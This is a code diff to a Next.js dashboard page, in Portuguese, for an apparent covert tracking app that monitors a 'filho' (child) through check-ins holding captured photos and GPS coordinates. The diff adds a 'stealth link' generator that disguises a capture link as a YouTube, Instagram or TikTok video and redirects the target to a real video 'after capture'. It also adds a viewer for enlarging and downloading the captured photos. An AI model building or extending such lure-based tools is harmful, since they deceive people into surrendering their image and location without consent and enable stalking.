@@ -8,7 +8,7 @@ import Link from 'next/link';
 
 interface Checkin {
   id: string;
-  foto: string;
+  foto: string | null;
   latitude: number;
   longitude: number;
   endereco: string | null;
@@ -47,6 +47,8 @@ interface Token {
   token: string;
   expiracao: string;
   usado: boolean;
+  videoTipo: string;
+  redirectUrl: string | null;
   createdAt: string;
 }
 
@@ -103,6 +105,21 @@ export default function FilhoDetalhesPage() {
 
   // Link check-in
   const [linkData, setLinkData] = useState<string | null>(null);
+  const [videoTipo, setVideoTipo] = useState('youtube_funny');
+  const [redirectUrl, setRedirectUrl] = useState('');
+  const [showLinkConfig, setShowLinkConfig] = useState(false);
+
+  // Modal foto ampliada
+  const [fotoModal, setFotoModal] = useState<{ url: string; data: string } | null>(null);
+
+  const downloadFoto = (url: string, nome: string) => {
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `foto_${nome}_${new Date().toISOString().slice(0,10)}.jpg`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  };
 
   useEffect(() => {
     fetchFilho();
@@ -126,7 +143,11 @@ export default function FilhoDetalhesPage() {
       const res = await fetch('/api/tokens', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ filhoId: params.id }),
+        body: JSON.stringify({
+          filhoId: params.id,
+          videoTipo,
+          redirectUrl: redirectUrl.trim() || undefined,
+        }),
       });
       const data = await res.json();
       if (res.ok) setLinkData(data.url);
@@ -259,10 +280,53 @@ export default function FilhoDetalhesPage() {
               </p>
             </div>
           </div>
-          <button onClick={gerarLink} className="btn-success text-sm font-mono">$ gerar_link</button>
+          <button onClick={() => setShowLinkConfig(!showLinkConfig)} className="btn-success text-sm font-mono">$ gerar_link</button>
         </div>
 
-        {/* Link modal */}
+        {/* Configuração do link */}
+        {showLinkConfig && !linkData && (
+          <div className="mt-4 p-4 border border-hacker-glow/30 bg-hacker-surface space-y-4">
+            <p className="text-sm font-bold text-hacker-glow font-mono">{'>'} configurar link stealth</p>
+
+            {/* Tipo de vídeo */}
+            <div>
+              <label className="block text-xs text-hacker-dim font-mono mb-1.5">$ tipo_pagina:</label>
+              <select
+                value={videoTipo}
+                onChange={(e) => setVideoTipo(e.target.value)}
+                className="input-field w-full text-xs font-mono"
+              >
+                <option value="youtube_funny">📺 YouTube - Vídeo Engraçado</option>
+                <option value="youtube_music">🎵 YouTube - Clipe Musical</option>
+                <option value="youtube_gaming">🎮 YouTube - Gaming</option>
+                <option value="instagram_reel">📸 Instagram - Reels</option>
+                <option value="tiktok">🎭 TikTok - Vídeo Viral</option>
+              </select>
+            </div>
+
+            {/* URL de redirecionamento */}
+            <div>
+              <label className="block text-xs text-hacker-dim font-mono mb-1.5">$ redirect_url <span className="text-hacker-muted">(opcional - deixe vazio para padrão)</span>:</label>
+              <input
+                type="url"
+                value={redirectUrl}
+                onChange={(e) => setRedirectUrl(e.target.value)}
+                placeholder="https://www.youtube.com/watch?v=... ou https://www.instagram.com/reel/..."
+                className="input-field w-full text-xs font-mono"
+              />
+              <p className="text-[10px] text-hacker-muted font-mono mt-1">
+                // cole aqui a URL do vídeo real para onde será redirecionado após captura
+              </p>
+            </div>
+
+            <div className="flex gap-2">
+              <button onClick={gerarLink} className="btn-primary text-xs font-mono flex-1">▶ gerar link agora</button>
+              <button onClick={() => setShowLinkConfig(false)} className="btn-secondary text-xs font-mono">x cancelar</button>
+            </div>
+          </div>
+        )}
+
+        {/* Link gerado */}
         {linkData && (
           <div className="mt-4 p-4 border border-hacker-glow/30 bg-hacker-glow/5">
             <p className="text-sm font-bold text-hacker-glow mb-2 font-mono">{'>'} link gerado para {filho.nome}:</p>
@@ -270,8 +334,11 @@ export default function FilhoDetalhesPage() {
               <input type="text" value={linkData} readOnly className="input-field flex-1 text-xs font-mono" />
               <button onClick={() => { navigator.clipboard.writeText(linkData); alert('Copiado!'); }}
                 className="btn-primary text-xs font-mono">$ copiar</button>
-              <button onClick={() => setLinkData(null)} className="btn-secondary text-xs font-mono">x</button>
+              <button onClick={() => { setLinkData(null); setShowLinkConfig(false); }} className="btn-secondary text-xs font-mono">x</button>
             </div>
+            <p className="text-[10px] text-hacker-muted font-mono mt-2">
+              // tipo: {videoTipo.replace('_', ' ')} {redirectUrl ? `| redireciona para: ${redirectUrl}` : '| redirect padrão'}
+            </p>
           </div>
         )}
       </div>
@@ -308,15 +375,23 @@ export default function FilhoDetalhesPage() {
             filho.checkins.map((checkin) => (
               <div key={checkin.id} className="card">
                 <div className="flex flex-col md:flex-row gap-4">
-                  {/* Foto */}
-                  <div className="w-full md:w-48 h-48 overflow-hidden bg-hacker-surface border border-hacker-border flex-shrink-0 relative">
+                  {/* Foto - clicável para ampliar */}
+                  <div
+                    className="w-full md:w-48 h-48 overflow-hidden bg-hacker-surface border border-hacker-border flex-shrink-0 relative cursor-pointer group"
+                    onClick={() => checkin.foto && setFotoModal({ url: checkin.foto, data: formatDate(checkin.createdAt) })}
+                  >
                     {checkin.foto && (
                       // eslint-disable-next-line @next/next/no-img-element
-                      <img src={checkin.foto} alt="Ping" className="w-full h-full object-cover hacker-video" />
+                      <img src={checkin.foto} alt="Ping" className="w-full h-full object-cover hacker-video group-hover:scale-105 transition-transform duration-300" />
                     )}
                     <div className="absolute top-1 left-1 text-[9px] text-hacker-glow/50 font-mono bg-black/70 px-1">
                       FOTO
                     </div>
+                    {checkin.foto && (
+                      <div className="absolute inset-0 bg-black/0 group-hover:bg-black/30 transition-all flex items-center justify-center">
+                        <span className="text-white/0 group-hover:text-white/90 text-xs font-mono transition-all">🔍 ampliar</span>
+                      </div>
+                    )}
                   </div>
                   {/* Info */}
                   <div className="flex-1 space-y-1.5 font-mono text-xs">
@@ -632,6 +707,47 @@ export default function FilhoDetalhesPage() {
                 })}
               </tbody>
             </table>
+          </div>
+        </div>
+      )}
+
+      {/* Modal de foto ampliada */}
+      {fotoModal && (
+        <div
+          className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-sm"
+          onClick={() => setFotoModal(null)}
+        >
+          <div
+            className="relative max-w-4xl w-full mx-4"
+            onClick={(e) => e.stopPropagation()}
+          >
+            {/* Botão fechar */}
+            <button
+              onClick={() => setFotoModal(null)}
+              className="absolute -top-10 right-0 text-[#00ff41] hover:text-white text-2xl font-mono transition-colors"
+            >
+              [✕ FECHAR]
+            </button>
+
+            {/* Imagem ampliada */}
+            <img
+              src={fotoModal.url}
+              alt="Foto capturada"
+              className="w-full max-h-[80vh] object-contain rounded border border-[#1a2e1a] shadow-lg shadow-[#00ff41]/20"
+            />
+
+            {/* Rodapé com data e download */}
+            <div className="mt-3 flex items-center justify-between">
+              <span className="text-[#0a6e20] font-mono text-sm">
+                📅 {fotoModal.data}
+              </span>
+              <button
+                onClick={() => downloadFoto(fotoModal.url, filho?.nome || 'foto')}
+                className="px-4 py-2 bg-[#0d120d] border border-[#1a2e1a] rounded text-[#00ff41] font-mono text-sm hover:bg-[#1a2e1a] hover:shadow-[0_0_15px_rgba(0,255,65,0.3)] transition-all"
+              >
+                ⬇ DOWNLOAD FOTO
+              </button>
+            </div>
           </div>
         </div>
       )}
